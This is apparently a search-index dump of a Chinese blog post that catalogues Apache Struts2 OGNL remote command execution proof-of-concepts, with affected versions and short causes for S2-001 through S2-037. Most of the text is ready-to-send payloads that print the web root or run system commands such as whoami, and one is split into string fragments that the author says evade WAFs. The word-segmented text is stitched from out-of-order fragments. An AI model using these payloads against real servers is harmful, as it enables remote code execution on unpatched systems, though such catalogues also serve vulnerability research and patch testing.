getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close ( ) }   Struts2   S2 - 005   \u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.1 . 8.1   \u6f0f\u6d1e \u8be6\u60c5 :   http : / / struts . apache . org / docs / s2 - 005 . html   struts2 \u6f0f\u6d1e \u7684 \u8d77\u6e90 \u6e90\u4e8e S2 - 003 ( \u53d7 \u5f71\u54cd \u7248\u672c :   \u4f4e\u4e8e Struts   2.0 . 12 ) \uff0c struts2 \u4f1a \u5c06 http \u7684 \u6bcf\u4e2a \u53c2\u6570 \u540d \u89e3\u6790 \u4e3a ongl \u8bed\u53e5 \u6267\u884c ( \u53ef \u7406\u89e3 \u4e3a java \u4ee3\u7801 ) \u3002 ongl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u901a\u8fc7 ## \u6765 \u8bbf\u95ee struts \u7684 \u5bf9\u8c61 \uff0c struts \u6846\u67b6 \u901a\u8fc7 \u8fc7\u6ee4 ## \u5b57\u7b26 \u9632\u6b62 \u5b89\u5168 \u95ee\u9898 \uff0c \u7136\u800c \u901a\u8fc7 unicode \u7f16\u7801 ( \\ u0023 ) \u6216 8 \u8fdb\u5236 ( \\ 43 ) \u5373 \u7ed5\u8fc7 \u4e86 \u5b89\u5168 \u9650\u5236 \uff0c \u5bf9\u4e8e S2 - 003 \u6f0f\u6d1e \uff0c \u5b98\u65b9 \u901a\u8fc7 \u589e\u52a0 \u5b89\u5168 \u914d\u7f6e ( \u7981\u6b62 \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u8c03\u7528 \u548c \u7c7b \u65b9\u6cd5 \u6267\u884c \u7b49 ) \u6765 \u4fee\u8865 \uff0c \u4f46\u662f \u5b89\u5168 \u914d\u7f6e \u88ab \u7ed5\u8fc7 \u518d\u6b21 \u5bfc\u81f4 \u4e86 \u6f0f\u6d1e \uff0c \u653b\u51fb \u653b\u51fb\u8005 \u53ef\u4ee5 \u5229\u7528 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8bb2 \u8fd9 2 \u4e2a \u9009\u9879 \u6253\u5f00 \uff0c S2 - 003 \u7684 \u4fee\u8865 \u65b9\u6848 \u628a \u81ea\u5df1 \u4e0a \u4e86 \u4e00\u4e2a \u9501 \uff0c \u4f46\u662f \u628a \u9501 \u94a5\u5319 \u7ed9 \u63d2 \u5728 \u4e86 \u9501 \u5934\u4e0a   \u4e0a\u6587 \u5f15\u7528   LittleHann   \u7684 \u63cf\u8ff0   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   ( ' \\ 43 _ memberAccess . allowStaticMethodAccess ' ) ( a ) = true & ( b ) ( ( ' \\ 43context [ \\ ' xwork . MethodAccessor . denyMethodExecution \\ ' ] \\ 75false ' ) ( b ) ) & ( ' \\ 43c ' ) ( ( ' \\ 43 _ memberAccess . excludeProperties \\ 75 @ java . util . Collections @ EMPTY _ SET ' ) ( c ) ) & ( g ) ( ( ' \\ 43req \\ 75 @ org . apache . struts2 . ServletActionContext @ getRequest ( ) ' ) ( d ) ) & ( i2 ) ( ( ' \\ 43xman \\ 75 @ org . apache . struts2 . ServletActionContext @ getResponse ( ) ' ) ( d ) ) & ( i97 ) ( ( ' \\ 43xman . getWriter ( ) . println ( \\ 43req . getRealPath ( % 22 \\ u005c% 22 ) ) ' ) ( d ) ) & ( i99 ) ( ( ' \\ 43xman . getWriter ( ) . close ( ) ' ) ( d ) )   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   ( ' \\ 43 _ memberAccess . allowStaticMethodAccess ' ) ( a ) = true & ( b ) ( ( ' \\ 43context [ \\ ' xwork . MethodAccessor . denyMethodExecution \\ ' ] \\ 75false ' ) ( b ) ) & ( ' \\ 43c ' ) ( ( ' \\ 43 _ memberAccess . excludeProperties \\ 75 @ java . util . Collections @ EMPTY _ SET ' ) ( c ) ) & ( g ) ( ( ' \\ 43mycmd \\ 75 \\ ' \" + cmd + \" \\ ' ' ) ( d ) ) & ( h ) ( ( ' \\ 43myret \\ 75 @ java . lang . Runtime @ getRuntime ( ) . exec ( \\ 43mycmd ) ' ) ( d ) ) & ( i ) ( ( ' \\ 43mydat \\ 75new \\ 40java . io . DataInputStream ( \\ 43myret . getInputStream ( ) ) ' ) ( d ) ) & ( j ) ( ( ' \\ 43myres \\ 75new \\ 40byte [ 51020 ] ' ) ( d ) ) & ( k ) ( ( ' \\ 43mydat . readFully ( \\ 43myres ) ' ) ( d ) ) & ( l ) ( ( ' \\ 43mystr \\ 75new \\ 40java . lang . String ( \\ 43myres ) ' ) ( d ) ) & ( m ) ( ( ' \\ 43myout \\ 75 @ org . apache . struts2 . ServletActionContext @ getResponse ( ) ' ) ( d ) ) & ( n ) ( ( ' \\ 43myout . getWriter ( ) . println ( \\ 43mystr ) ' ) ( d ) )   \u4e0a\u9762 2 \u4e2a PoC \u6458\u81ea k8team \uff0c \u4e3a\u4e86 \u5199 PoC \uff0c \u6709\u6240 \u6539\u52a8 \uff0c \u4f46\u662f \u8fd9\u91cc \u5c31 \u4e0d \u4e0a\u6765 \u8d34\u4e0a\u6765 \u4e86 \uff1a \uff09   Struts2   S2 - 009   \u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 1.1   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / struts . apache . org / docs / s2 - 009 . html   \u6f0f\u6d1e \u5229\u7528 \u70b9 \u8ddf S2 - 003 \u548c S2 - 005 \u7c7b\u4f3c \uff0c \u5229\u7528 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f ( 1 ) ( 2 ) , \u4f1a \u6267\u884c 1 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c 009 \u6784\u9020 \u4e86 \u7684 \u65b9\u6cd5 \u4e3a test = ( some   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f ) ( 1 ) & z [ ( test ) ( 1 ) ] = true \u3002   z [ ( test ) ( 1 ) ] = true , \u5bf9 struts2 \u6765\u8bf4 \u662f \u5408\u6cd5 \u7684 \u53c2\u6570 \uff0c \u4f46\u662f ( test ) ( 1 ) \u4f1a \u6267\u884c \u4e0a\u8ff0 \u8bf4 \u7684 \u65b9\u6cd5 \uff0c test \u7684 \u503c \u88ab \u5e26\u5165 \u8ba1\u7b97 \uff0c \u9020\u6210 \u547d\u4ee4 \u6267\u884c \u3002   \u6784\u9020 PoC   ##   \u5f39 \u8ba1\u7b97 \u7b97\u5668 \u8ba1\u7b97\u5668   ps : \u5b9e\u9a8c \u73af\u5883 \u8bd5 \u4e86 \u597d \u51e0\u6b21 \u90fd \u4e0d\u80fd \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \uff0c \u8def\u8fc7 \u7684 \u5927\u4f6c \u6c42 \u6307\u6559 \uff1a \uff09   person . name = ( ## context [ \" xwork . MethodAccessor . denyMethodExecution \" ] =   new   java . lang . Boolean ( false ) ,   ##_ memberAccess [ \" allowStaticMethodAccess \" ] =   new   java . lang . Boolean ( true ) ,   @ java . lang . Runtime @ getRuntime ( ) . exec ( ' open   / Applications / Calculator . app ' ) ) ( meh ) & z [ ( person . name ) ( ' meh ' ) ] = true   \u7528 \u7684 \u662f   person / new - person . action   \u8fd9\u4e2a \u63a7\u5236 \u63a7\u5236\u5668   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   person . name = % 28% 23context% 5B% 22xwork . MethodAccessor . denyMethodExecution% 22% 5D% 3D% 20new% 20java . lang . Boolean% 28false% 29% 2C% 23 _ memberAccess% 5B% 22allowStaticMethodAccess% 22% 5D% 3Dtrue% 2C% 23req% 3D @ org . apache . struts2 . ServletActionContext @ getRequest% 28% 29% 2C% 23outstr% 3D @ org . apache . struts2 . ServletActionContext @ getResponse% 28% 29 . getWriter% 28% 29% 2C% 23outstr . println% 28% 27webpath% 3A% 27% 2b% 23req . getRealPath% 28% 22% 2f% 22% 29% 29% 2C% 23outstr . close% 28% 29% 29% 28meh% 29 & z% 5B% 28person . name% 29% 28% 27meh% 27% 29% 5D \"   Struts2   S2 - 012   \u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 13   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / cwiki . apache . org / confluence / display / WW / S2 - 012   Action   \u4e2d   Result   \u65f6 \u4f7f\u7528 \u4e86 \u5b9a\u5411 \u91cd\u5b9a\u5411 \u7c7b\u578b \uff0c \u5e76\u4e14 \u8fd8 \u4f7f\u7528   $ { param _ name }   \u4f5c\u4e3a \u5b9a\u5411 \u91cd\u5b9a\u5411 \u53d8\u91cf , struts \u5728 \u83b7\u53d6 \u5176\u503c \u65f6\u4f1a \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4ece\u800c \u9020\u6210 \u547d\u4ee4 \u6267\u884c   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u6839 \u8def\u5f84   % 25% 7B% 28% 23context% 5B% 27xwork . MethodAccessor . denyMethodExecution% 27% 5D% 3Dfalse% 29% 28% 23 _ memberAccess% 5B% 27allowStaticMethodAccess% 27% 5D% 3Dtrue% 29% 28% 23req% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletRequest% 27% 29% 2C% 23response% 3D% 23context . get% 28% 22com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 22% 29 . getWriter% 28% 29% 2C% 23response . println% 28% 27webpath% 3A% 27% 2b% 23req . getSession% 28% 29 . getServletContext% 28% 29 . getRealPath% 28% 27% 2f% 27% 29% 29% 2C% 23response . flush% 28% 29% 2C% 23response . close% 28% 29% 29% 7D   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   % 25% 7B% 28% 23context% 5B% 27xwork . MethodAccessor . denyMethodExecution% 27% 5D% 3Dfalse% 29% 28% 23 _ memberAccess% 5B% 27allowStaticMethodAccess% 27% 5D% 3Dtrue% 29% 28% 23a% 3D% 28new% 20java . lang . ProcessBuilder% 28% 27whoami% 27% 29% 29 . start% 28% 29% 2C% 23b% 3D% 23a . getInputStream% 28% 29% 2C% 23c% 3Dnew% 20java . io . InputStreamReader% 28% 23b% 29% 2C% 23d% 3Dnew% 20java . io . BufferedReader% 28% 23c% 29% 2C% 23e% 3Dnew% 20char% 5B50000% 5D% 2C% 23d . read% 28% 23e% 29% 2C% 23matt% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 27% 29% 2C% 23matt . getWriter% 28% 29 . println% 28% 27dbapp% 3A% 27% 2bnew% 20java . lang . String% 28% 23e% 29% 29% 2C% 23matt . getWriter% 28% 29 . flush% 28% 29% 2C% 23matt . getWriter% 28% 29 . close% 28% 29% 29% 7D% 0A% 0A   Struts2   S2 - 013 / S2 - 014   \u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 14.1   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / cwiki . apache . org / confluence / display / WW / S2 - 013 , https : / / cwiki . apache . org / confluence / display / WW / S2 - 014   \u6807\u7b7e   s : url   \u548c   s : a   \u4e2d \u63d0\u4f9b include \u53c2\u6570 \uff0c \u5176 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u53ef\u4ee5 \u4e3a   none   -   include   no   parameters   in   the   URL   ( default )   get   -   include   only   GET   parameters   in   the   URL   all   -   include   both   GET   and   POST   parameters   in   the   URL   \u5982\u679c \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u4e3a get \u6216 all \uff0c \u5728 \u83b7\u53d6 \u5bf9\u5e94 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u65f6 \u6267\u884c \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   a = $ { ( % 23 _ memberAccess [ \" allowStaticMethodAccess \" ] = true , % 23req = @ org . apache . struts2 . ServletActionContext @ getRequest ( ) , % 23out = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , % 23out . println ( ' webpath% 3a ' % 2b% 23req . getRealPath ( \" / \" ) ) , % 23out . close ( ) ) }   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   a = $ { ( % 23 _ memberAccess [ \" allowStaticMethodAccess \" ] = true , % 23a = @ java . lang . Runtime @ getRuntime ( ) . exec ( ' \" + cmd + \" ' ) . getInputStream ( ) , % 23b = new + java . io . InputStreamReader ( % 23a ) , % 23c = new + java . io . BufferedReader ( % 23b ) , % 23d = new + char [ 50000 ] , % 23c . read ( % 23d ) , % 23out = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , % 23out . println ( ' dbapp% 3a ' % 2bnew   java . lang . String ( % 23d ) ) , % 23out . close ( ) ) }   Struts2   S2 - 016   \u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 15   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / struts . apache . org / docs / s2 - 016 . html   \u200b   DefaultActionMapper   \u7c7b \u652f\u6301 \u4ee5   action : \uff0c redirect :   \u548c   redirectAction :   \u4f5c\u4e3a \u8bbf\u95ee \u524d\u7f00 \uff0c \u524d\u7f00 \u540e\u9762 \u53ef\u4ee5 \u8ddf   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u7531\u4e8e   Struts2   \u672a \u5bf9 \u5176 \u8fdb\u884c \u8fc7\u6ee4 \uff0c \u5bfc\u81f4 \u4efb\u610f   Action   \u53ef\u4ee5 \u4f7f\u7528 \u8fd9\u4e9b \u524d\u7f00 \u6267\u884c \u4efb\u610f   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4ece\u800c \u5bfc\u81f4 \u4efb\u610f \u547d\u4ee4 \u6267\u884c   \u4e0a\u6587 \u5f15\u7528   rickgray   \u7684 \u63cf\u8ff0 \u3002   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   ? redirect : $ { ## req = ## context . get ( ' co ' + ' m . open ' + ' symphony . xwo ' + ' rk2 . disp ' + ' atcher . HttpSer ' + ' vletReq ' + ' uest ' ) , ## resp = ## context . get ( ' co ' + ' m . open ' + ' symphony . xwo ' + ' rk2 . disp ' + ' atcher . HttpSer ' + ' vletRes ' + ' ponse ' ) , ## resp . setCharacterEncoding ( ' UTF - 8 ' ) , ## ot = ## resp . getWriter   ( ) , ## ot . print ( ' web ' ) , ## ot . print ( ' path : ' ) , ## ot . print ( ## req . getSession ( ) . getServletContext ( ) . getRealPath ( ' / ' ) ) , ## ot . flush ( ) , ## ot . close ( ) }   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   ? redirect : $ { ## a = ( new   java . lang . ProcessBuilder ( new   java . lang . String [ ] { ' whoami ' } ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( ' co ' + ' m . ope ' + ' nsymph ' + ' ony . x ' + ' wor ' + ' k2 . disp ' + ' atch ' + ' er . HttpSe ' + ' rvletRe ' + ' sponse ' ) , ## matt . getWriter ( ) . println ( new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close ( ) } '   \u8fd8\u6709 \u4e00\u79cd \u6bd4\u8f83 \u9690\u853d \u7684 \u65b9\u6cd5 \uff0c \u5c06 PoC \u653e\u5728 \u6587\u4ef6 \u4e0a\u4f20 \u7684 name \u5904 \uff0c \u8fc7 waf \u3002   Struts2   S2 - 019   \u5f71\u54cd \u7248\u672c :   2.0 . 0   -   2.3 . 15.1   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / cwiki . apache . org / confluence / display / WW / S2 - 019   \u8be5 \u6f0f\u6d1e \u6210 \u56e0\u4e3a \u5f00\u542f \u4e86 \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \uff0c \u4f20\u5165   debug = command & expression =   \u5bfc\u81f4 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4ece\u800c \u9020\u6210 \u547d\u4ee4 \u6267\u884c \u6f0f\u6d1e \u3002   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u6839 \u8def\u5f84   debug = command & expression = % 23req% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletRequest% 27% 29% 2C% 23resp% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 27% 29% 2C% 23resp . setCharacterEncoding% 28% 27UTF - 8% 27% 29% 2C% 23resp . getWriter% 28% 29 . println% 28% 27webpath% 3A% 27% 2b% 23req . getSession% 28% 29 . getServletContext% 28% 29 . getRealPath% 28% 27% 2f% 27% 29% 29% 2C% 23resp . getWriter% 28% 29 . flush% 28% 29% 2C% 23resp . getWriter% 28% 29 . close% 28% 29   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   debug = command & expression = % 23a% 3D% 28new% 20java . lang . ProcessBuilder% 28% 27whoami% 27% 29% 29 . start% 28% 29% 2C% 23b% 3D% 23a . getInputStream% 28% 29% 2C% 23c% 3Dnew% 20java . io . InputStreamReader% 28% 23b% 29% 2C% 23d% 3Dnew% 20java . io . BufferedReader% 28% 23c% 29% 2C% 23e% 3Dnew% 20char% 5B50000% 5D% 2C% 23d . read% 28% 23e% 29% 2C% 23out% 3D% 23context . get% 28% 27com . opensymphony . xwork2 . dispatcher . HttpServletResponse% 27% 29% 2C% 23out . getWriter% 28% 29 . println% 28% 27dbapp% 3A% 27% 2bnew% 20java . lang . String% 28% 23e% 29% 29% 2C% 23out . getWriter% 28% 29 . flush% 28% 29% 2C% 23out . getWriter% 28% 29 . close% 28% 29% 0A   Struts2   S2 - 032   \u5f71\u54cd \u7248\u672c :   2.3 . 20   -   2.3 . 28   ( except   2.3 . 20.3   and   2.3 . 24.3 )   \u6f0f\u6d1e \u8be6\u60c5 :   https : / / struts . apache . org / docs / s2 - 032 . html   \u5728 \u914d\u7f6e \u4e86   Struts2   DMI   \u4e3a   True   \u7684 \u60c5\u51b5 \u4e0b \uff0c \u53ef\u4ee5 \u4f7f\u7528   method :   Action   \u524d\u7f00 \u53bb \u8c03\u7528 \u58f0\u660e \u4e3a   public   \u7684 \u51fd\u6570 \uff0c DMI   \u7684 \u76f8\u5173 \u4f7f\u7528 \u65b9\u6cd5 \u53ef \u53c2\u8003 \u5b98\u65b9 \u4ecb\u7ecd \uff08 Dynamic   Method   Invocation \uff09 \uff0c \u8fd9\u4e2a   DMI   \u7684 \u8c03\u7528 \u7279\u6027 \u5176\u5b9e \u4e00\u76f4 \u5b58\u5728 \uff0c \u4e0d\u8fc7 \u53ea\u4e0d\u8fc7 \u5728 \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u4e2d   Strtus2   \u4e0d\u4f1a \u5bf9   name   \u65b9\u6cd5 \u503c \u505a   OGNL   \u8ba1\u7b97 \uff0c \u800c \u5728 \u9ad8 \u7248\u672c \u4e2d \u4f1a \uff0c \u4ee3\u7801 \u8be6\u60c5 \u53ef \u53c2\u8003 \u963f\u5c14\u6cd5 \u5b9e\u9a8c \u5b9e\u9a8c\u5ba4 \u7684 \u62a5\u544a   -   \u300a Apache   Struts2   s2 - 032 \u6280\u672f \u5206\u6790 \u53ca \u6f0f\u6d1e \u68c0\u6d4b \u811a\u672c \u300b   \u4e0a\u6587 \u5f15\u7528   rickgray   \u7684 \u63cf\u8ff0 \u3002   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   ? method : ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS , ## req = ## context . get ( ## parameters . a [ 0 ] ) , ## resp = ## context . get ( ## parameters . b [ 0 ] ) , ## resp . setCharacterEncoding ( ## parameters . c [ 0 ] ) , ## ot = ## resp . getWriter   ( ) , ## ot . print ( ## parameters . e [ 0 ] +## req . getSession ( ) . getServletContext ( ) . getRealPath ( ## parameters . d [ 0 ] ) ) , ## ot . flush ( ) , ## ot . close & a = com . opensymphony . xwork2 . dispatcher . HttpServletRequest & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = UTF - 8 & d = / & e = webpath :   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   ? method : ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS , ## a = ( new   java . lang . ProcessBuilder ( ## parameters . a [ 0 ] ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( ## parameters . b [ 0 ] ) , ## matt . getWriter ( ) . println ( ## parameters . c [ 0 ] + new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close & a = whoami & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = flag :   Struts2   S2 - 037   \u5f71\u54cd \u7248\u672c :   2.3 . 20   -   2.3 . 28.1   \u6f0f\u6d1e \u8be6\u60c5 :   http : / / struts . apache . org / docs / s2 - 037 . html   \u8fd9\u4e2a \u6f0f\u6d1e \u548c \u4e4b\u524d S2 - 032 / 033 \u662f \u4e00\u4e2a \u5730\u65b9 \uff0c \u90fd \u662f \u5728 DefaultActionInvocation . java \u7684 invokeAction \u65b9\u6cd5 \u4e2d \u6ca1\u6709 \u5bf9\u4e8e methodName \u53c2\u6570 \u5185\u5bb9 \u8fdb\u884c \u6821\u9a8c \uff0c \u4fbf \u76f4\u63a5 \u4e22\u5230 \u4e86 getValue \u65b9\u6cd5 \u91cc\u9762 \uff0c \u4ece\u800c \u9020\u6210 Ongl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6ce8\u5165 \u3002   \u4e0a\u6587 \u5f15\u7528   nsfocus   \u7684 \u63cf\u8ff0   \u6784\u9020 PoC   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   / ( ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS ) ? ( ## req = ## context . get ( ## parameters . a [ 0 ] ) , ## resp = ## context . get ( ## parameters . b [ 0 ] ) , ## resp . setCharacterEncoding ( ## parameters . c [ 0 ] ) , ## ot = ## resp . getWriter   ( ) , ## ot . print ( ## parameters . e [ 0 ] +## req . getSession ( ) . getServletContext ( ) . getRealPath ( ## parameters . d [ 0 ] ) ) , ## ot . flush ( ) , ## ot . close ) : xx . toString . json ? & a = com . opensymphony . xwork2 . dispatcher . HttpServletRequest & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = UTF - 8 & d = / & e = webpath :   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   / ( ##_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS ) ? ( ## a = ( new   java . lang . ProcessBuilder ( ## parameters . a [ 0 ] ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( ## parameters . b [ 0 ] ) , ## matt . getWriter ( ) . println ( ## parameters . c [ 0 ] + new   java . lang . String ( ## e ) ) , ## matt . getWriter ( ) . flush ( ) , ## matt . getWriter ( ) . close ( ) ) : xx . toString . json ? & a = whoami & b = com . opensymphony . xwork2 . dispatcher . HttpServletResponse & c = flag :   \u603b\u7ed3   Struts2 \u547d\u4ee4 \u6267\u884c \u7b97\u662f \u4e00\u4e2a \u6bd4\u8f83 \u7ecf\u5178 \u7684 \u6f0f\u6d1e \u4e86 \uff0c \u5e0c\u671b \u4ee5\u540e \u6df1\u5165 java \u7684 \u4e00\u4e9b \u6846\u67b6 \uff0c \u53ef\u4ee5 \u4ece \u5e95\u5c42 \u6765 \u5206\u6790 \uff1a \uff09","title":"Struts2 \u547d\u4ee4 \u6267\u884c \u5404 \u7248\u672c \u8bb0\u5f55"},{"location":"blog/2017/struts2-history-payload/#_1","text":"\u6700\u8fd1 \u5728 \u5199 Struts2 \u7684 \u4e00\u4e9b PoC \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u5404\u4e2a \u7248\u672c \u7684 PoC \u65b9\u4fbf \u65f6\u5019 \u5230\u65f6\u5019 \u67e5\u9605 \u3002 \u5148\u63d0 \u4e00\u4e0b \u53c2\u8003 \u7684 \u524d\u8f88 \u4eec \u7684 \u7f51\u5740 \uff0c \u611f\u8c22 \ud83d\ude4f   http : / / rickgray . me / 2016 / 05 / 06 / review - struts2 - remote - command - execution - vulnerabilities . html   http : / / www . cnblogs . com / LittleHann / p / 4606891 . html   https : / / cwiki . apache . org / confluence / display / WW / S2 - xxx   http : / / blog . nsfocus . net / tech / % E7% 83% AD% E7% 82% B9% E8% B7% 9F% E8% B8% AA / 2016 / 06 / 16 / Struts2 - S2 - 037 ( CVE - 2016 - 4438 ) % E6% BC% 8F% E6% B4% 9E% E5% 88% 86% E6% 9E% 90 . html   https : / / cwiki . apache . org / confluence / display / WW / S2 - 009","title":"\u6982\u8ff0"},{"location":"blog/2017/struts2-history-payload/#struts2","text":"\u4e0b\u6587 \u4e0d\u662f \u5177\u4f53 \u7684 \u5206\u6790 \u6587 \uff0c \u80fd\u529b \u6709\u9650 \uff0c \u4ec5 \u8bb0\u5f55 \u4e00\u4e0b \u4ee5 \u505a \u5c06\u6765 \u590d\u4e60 \u67e5\u7528 \u3002   \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u8fc7\u6bb5\u65f6\u95f4 \u4f1a \u5c06 \u6240\u6709 \u7684 \u6f0f\u6d1e \u73af\u5883 \u4e0a \u4f20\u5230 github \u4e0a \uff0c \u73af\u5883 \u6765\u6e90 \u5927\u90e8 \u90e8\u5206 \u5927\u90e8\u5206 \u4e3a \u6211 \u5076\u50cf   rickgray   \u535a\u5ba2 \u4e0a \u5171\u4eab \u7684 \u4ee5\u53ca \u5b98 \u7f51\u4e0a \u4e0b \u7684 \u5bf9\u5e94 \u7248\u672c \u7684 \u793a\u4f8b \u73af\u5883 \u3002   update : 2017 / 1 / 16   \u73af\u5883 \u5730\u5740","title":"Struts2 \u547d\u4ee4 \u6267\u884c \u96c6\u5408"},{"location":"blog/2017/struts2-history-payload/#struts2-s2-001","text":"\u5f71\u54cd \u7248\u672c \uff1a 2.0 . 0   -   2.0 . 8   \u5177\u4f53 \u8be6\u60c5 \uff1a https : / / struts . apache . org / docs / s2 - 001 . html   \u8be5 \u6f0f\u6d1e \u56e0\u4e3a \u7528\u6237 \u63d0\u4ea4 \u8868\u5355 \u6570\u636e \u5e76\u4e14 \u9a8c\u8bc1 \u5931\u8d25 \u65f6 \uff0c \u540e\u7aef \u4f1a \u5c06 \u7528\u6237 \u4e4b\u524d \u63d0\u4ea4 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u4f7f\u7528   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   % { value }   \u8fdb\u884c \u89e3\u6790 \uff0c \u7136\u540e \u91cd\u65b0 \u586b\u5145 \u5230 \u5bf9\u5e94 \u7684 \u8868\u5355 \u6570\u636e \u4e2d \u3002 \u4f8b\u5982 \u6ce8\u518c \u6216 \u767b\u5f55 \u9875\u9762 \uff0c \u63d0\u4ea4 \u5931\u8d25 \u540e \u7aef \u4e00\u822c \u4f1a \u9ed8\u8ba4 \u8fd4\u56de \u4e4b\u524d \u63d0\u4ea4 \u7684 \u6570\u636e \uff0c \u7531\u4e8e \u540e \u7aef \u4f7f\u7528   % { value }   \u5bf9 \u63d0\u4ea4 \u7684 \u6570\u636e \u6267\u884c \u4e86 \u4e00\u6b21   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u89e3\u6790 \uff0c \u6240\u4ee5 \u53ef\u4ee5 \u76f4\u63a5 \u6784\u9020   Payload   \u8fdb\u884c \u547d\u4ee4 \u6267\u884c   \u4e0a\u6587 \u5f15\u7528   rickgray   \u7684 \u63cf\u8ff0 \u3002","title":"Struts2   S2 - 001"},{"location":"blog/2017/struts2-history-payload/#poc","text":"","title":"\u6784\u9020 PoC"},{"location":"blog/2017/struts2-history-payload/#tomcat","text":"% { \" tomcatBinDir { \" + @ java . lang . System @ getProperty ( \" user . dir \" ) + \" } \" }","title":"##   \u83b7\u53d6 tomcat \u6267\u884c \u8def\u5f84"},{"location":"blog/2017/struts2-history-payload/#web","text":"% { ## req = @ org . apache . struts2 . ServletActionContext @ getRequest ( ) , ## response = ## context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) , ## response . println ( ## req . getRealPath ( ' / ' ) ) , ## response . flush ( ) , ## response . close ( ) 